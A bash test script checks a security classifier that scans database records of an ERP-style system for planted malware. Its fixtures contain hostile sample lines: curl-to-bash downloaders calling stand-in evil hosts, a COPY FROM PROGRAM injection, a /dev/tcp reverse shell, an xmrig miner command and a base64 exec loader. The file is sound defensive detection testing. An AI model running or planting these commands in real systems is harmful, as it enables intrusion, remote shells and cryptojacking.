#!/usr/bin/env bash
# TEST-SEC-017/018 — DB classifier fixtures (no payload execution).
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
# shellcheck disable=SC1091
source "$ROOT/tests/helpers/s1_platform.sh"
s3_platform_source
export SOVIEZ_SH_ROOT="$ROOT"
export SOVIEZ_TEST_MODE=1

share="$ROOT/share/security/detection"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

classify() {
  python3 "$share/classify_records.py" "$share/db_rules.json" "$share/iocs.json" "$1"
}

# Benign server action — not CRITICAL
cat >"$tmp/benign.json" <<'EOF'
{"records":[{"model":"ir.actions.server","id":1,"name":"Benign","active":"t","field":"code","content":"env['res.partner'].browse(1).name","executable":true}]}
EOF
out="$(classify "$tmp/benign.json")"
echo "$out" | grep -q '"status": "PASS"'
! echo "$out" | grep -q '"severity": "CRITICAL"'

# Legitimate config URL — not malware
cat >"$tmp/url.json" <<'EOF'
{"records":[{"model":"ir.config_parameter","id":2,"name":"web.base.url","active":"t","field":"value","content":"https://portal.example.com","executable":false}]}
EOF
out="$(classify "$tmp/url.json")"
echo "$out" | grep -q '"status": "PASS"'

# COPY PROGRAM → CRITICAL / FAIL
cat >"$tmp/copy.json" <<'EOF'
{"records":[{"model":"ir.actions.server","id":3,"name":"evil","active":"t","field":"code","content":"COPY malicious FROM PROGRAM 'curl http://x'|bash","executable":true}]}
EOF
out="$(classify "$tmp/copy.json")"
echo "$out" | grep -q 'SDB001_COPY_PROGRAM'
echo "$out" | grep -q '"status": "FAIL"'

# os.system downloader → HIGH/FAIL
cat >"$tmp/os.json" <<'EOF'
{"records":[{"model":"ir.actions.server","id":4,"name":"dl","active":"t","field":"code","content":"os.system('curl http://payload-cdn.evil.example.test/drop.sh | bash')","executable":true}]}
EOF
out="$(classify "$tmp/os.json")"
echo "$out" | grep -Eq 'SDB002_OS_SYSTEM|SDB005_DOWNLOADER'
echo "$out" | grep -q '"status": "FAIL"'

# reverse shell → CRITICAL
cat >"$tmp/rs.json" <<'EOF'
{"records":[{"model":"ir.actions.server","id":5,"name":"rs","active":"t","field":"code","content":"bash -i >& /dev/tcp/198.51.100.66/4444 0>&1","executable":true}]}
EOF
out="$(classify "$tmp/rs.json")"
echo "$out" | grep -Eq 'SDB006_REVERSE_SHELL|SDB004_SHELL_EXEC'
echo "$out" | grep -q '"status": "FAIL"'

# xmrig/stratum → CRITICAL
cat >"$tmp/miner.json" <<'EOF'
{"records":[{"model":"ir.cron","id":6,"name":"mine","active":"t","field":"code","content":"run xmrig --url stratum+tcp://evil-miner-pool.example.test:3333","executable":true}]}
EOF
out="$(classify "$tmp/miner.json")"
echo "$out" | grep -Eq 'SDB007_XMRIG|SDB008_STRATUM'
echo "$out" | grep -q '"status": "FAIL"'

# obfuscation → HIGH
cat >"$tmp/obf.json" <<'EOF'
{"records":[{"model":"ir.actions.server","id":7,"name":"obf","active":"t","field":"code","content":"import base64; exec(base64.b64decode('YQ=='))","executable":true}]}
EOF
out="$(classify "$tmp/obf.json")"
echo "$out" | grep -q 'SDB009_OBFUSCATED_PAYLOAD'
echo "$out" | grep -q '"status": "FAIL"'

# Known IOC domain
cat >"$tmp/ioc.json" <<'EOF'
{"records":[{"model":"ir.config_parameter","id":8,"name":"x","active":"t","field":"value","content":"http://payload-cdn.evil.example.test/drop.sh","executable":false}]}
EOF
out="$(classify "$tmp/ioc.json")"
echo "$out" | grep -q 'known_ioc\|SDB_IOC\|SDB005\|SDB010'
echo "$out" | grep -q '"status": "FAIL"'

# QWeb suspicious panel
cat >"$tmp/qweb.json" <<'EOF'
{"records":[{"model":"ir.ui.view","id":9,"name":"panel","active":"t","field":"arch_db","content":"<t t-raw=\"os.system('curl http://x|bash')\"/>","executable":true}]}
EOF
out="$(classify "$tmp/qweb.json")"
echo "$out" | grep -q '"status": "FAIL"'

# Mutation / execution proof from classifier
echo "$out" | grep -q '"mutation_count": 0'
echo "$out" | grep -q '"executed_payloads": 0'

# Redaction: long secrets not dumped
echo "$out" | grep -q 'snippet'
! echo "$out" | grep -q 'password=secret123'

echo "PASS test_db_classifier_fixtures"
